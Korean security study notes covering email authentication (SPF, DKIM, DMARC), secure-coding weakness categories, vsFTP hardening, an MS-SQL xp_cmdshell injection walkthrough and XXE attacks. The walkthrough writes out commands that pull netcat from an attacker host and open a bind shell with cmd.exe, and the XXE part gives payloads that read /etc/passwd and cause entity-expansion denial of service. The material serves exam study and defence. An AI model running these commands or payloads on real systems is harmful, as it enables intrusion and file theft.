
### 스팸메일 방지 기술
* SPF (Sender Policy Framework) : 발신 메일서버 정보를 사전에 발신 도메인 DNS 서버에 공개적으로 등록함으로써 수신자가 수신한 메일의 발신자 IP 주소가 발신자 메일주소 도메인의 실제 메일서버 정보와 일치하는지 검사할 수 있도록 하는 이메일 인증 기술, 발진사 메일주소 도메인의 DNS에 등록된 SPF 레코드를 조회하여(TXT 레코드 질의) 실제 메일을 발송한 메일서버의 IP가 조회한 SPF 레코드에 동륵된 서버인지를 확인할 수 있다.
* DKIM (DomainKeys Identified Mail) : 발신자가 발신 메일의 메시지 헤더와 바디에 대한 디지털서명을 메일 헤더에 삽입하여 수신된 이메일이 위변조되지 않았는지 수신자가 검증할 수 있다. 수신자는 발신자 도메인의 DNS에 등록된 전자서명을 검증할 수 있는 정보(서명 알고리즘, 공개키)를 담고 있는 DKIM 레코드를 조회하여 서명검증을 수행한다.
* DMARC (Domain-based Message Authentication, Reporting and Conformance) : 정당한 발신자인지와 메일의 위변조 여부를 검사하고 수신 측에서 정책 처리 결과에 대한 DMARC 보고서를 발신자에게 전달함으로써 발신자가 메일 모니터링을 할 수 있는 이메일 인증 기술이다.

### 소프트웨어 개발보안 가이
1. 입력 데이터 검증 및 표현 : 입력값에 대한 검증 누락 또는 부적절한 검증, 데이터의 잘못된 형식 지정
2. 보안 기능 : 인증, 권한 관리, 암호화 등을 적절히 구현하지 않았을 때
3. 시간 및 상태 : 동시 또는 거의 동시 수행을 지원하는 병렬 시스템, 하나 이상의 프로세스가 동작하는 환경에서 시간이나 상태를 부적절하게 관리
4. 에러처리 : 에러 처리 하지 않거나 불충분하게 처리하여 에러 메시지에 중요 정보 포함
5. 코드 오류 : 타입 변환 오류, 자원 부적절한 반환 등의 코드 오류
6. 캡슐화 : 중요한 데이터 또는 기능성을 불충분하게 캡슐화하였을 때 인가되지 않은 사용자에게 데이터 노출
7. API 오용 : 의도된 사용에 반하는 방법으로 API를 사용하거나 보안에 취약한 API 사용

### vsFTP 
* anonymous 계정 접근 제한
* 확인 방법은 anonymous 로그인 명과 임의의 비밀번호를 사용하여 ftp 접근이 허용되는지 확인한다.
* 접근 제한 방법은 vsFTP 설정파일(vsftpd.conf)에 anonymous_enable=NO 로 설정한다.
* root 계정 접근제한
* 확인 방법은 ftpusers 파일에 root 계정이 등록 되어 있는지 확인한다.
* 접근 제한 방법은 vsftpd.conf 파일에 userlist_enable=YES 로 설정하고 cat /etc/vsftpd/user_list 에 root를 설정한다.
* vsftpd.conf 파일에 userlist_enable=NO 면 ftpusers에 root를 설정한다.

### MS-SQL 데이터베이스의 확장 프로시저인 xp_cmdshell 이용하여 윈도우의 IIS 웹서버에 SQL 인젝션 공격 수행 과정
```
xp_cmdshell 은 MS-SQL 데이터베이스에서 시스템 명령을 실행할 수 있는 확장 프로시저이다.
exec master..xp_cmdshell 'tftp -i 192.168.159.133 GET nc.exe c:\nc.exe' <- 공격자 서버(192.168.159.133)로부터 대상 웹서버(윈도우 서버)로 tftp를 이용하여 인증 없이 nc.exe(netcat) 프로그램을 다운로드 하여 c:\nc.exe에 저장
GET : 다운로드
-i : 바이너리 파일 전송
exec master..xp_cmdshell 'copy c:\windws\system32\cmd.exe /inetpub/scripts' <- 대상 웹서버의 윈도우 시스템에 있는 cmd.exe 를 IIS 웹서버의 스크립트 디렉터리(inetpub/scripts)로 복사한다.
exec master..xp_cmdshell 'c:\nc.exe -l -p 4567 -e cmd.exe' <- nc 프로그램을 실행시켜 4567 포트에서 리스닝하고 외부에서 접속하면 cmd.exe의 제어권 획득
```

### XXE (XML eXternal Entity) Inejection
* XML 입력값을 파싱하는 애플리케이션의 취약점을 이용한 공격으로 악의적인 XML 공격 코드를 애플리케이션 입력값으로 전달하여 시스템 파일 접근이나 외부 파일의 참조 등 악의적인 행위를 수행한다.
* 애플리케이션에서 XML 파서의 외부 엔티티 참조를 허용하는 경우, 시스템 파일을 참조하는 외부 엔티티를 선언한 후 이를 XML 내부에서 참조하는 방식으로 악의적인 시스템 파일 접근이 가능하다.
* ```<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>``` /etc/passwd 파일을 참조하는 xxe 외부 엔티티를 선언하고  XML 내부에서 이를 참조하고 있다.
* ```<!ENTITY lol "lol">```
* ```<!ENTITY lol2 "&lol;"&lol;"&lol;"&lol;"&lol;"&lol;"&lol;"&lol;"&lol;"&lol;">```
* ...
* ...
* 엔티티를 반복적으로 참조하도록 하여 이를 처리하는 애플리케이션에 부하를 발생시키는 일종의 도스 형태의 공격이다. XML 내부에서 lol2 엔티티(&lol2)를 참조하고 있는데 lol2 엔티티는 상위에 선언된 lol 엔티티를 다수 참조하고 있고 등등 부하를 시킨다.
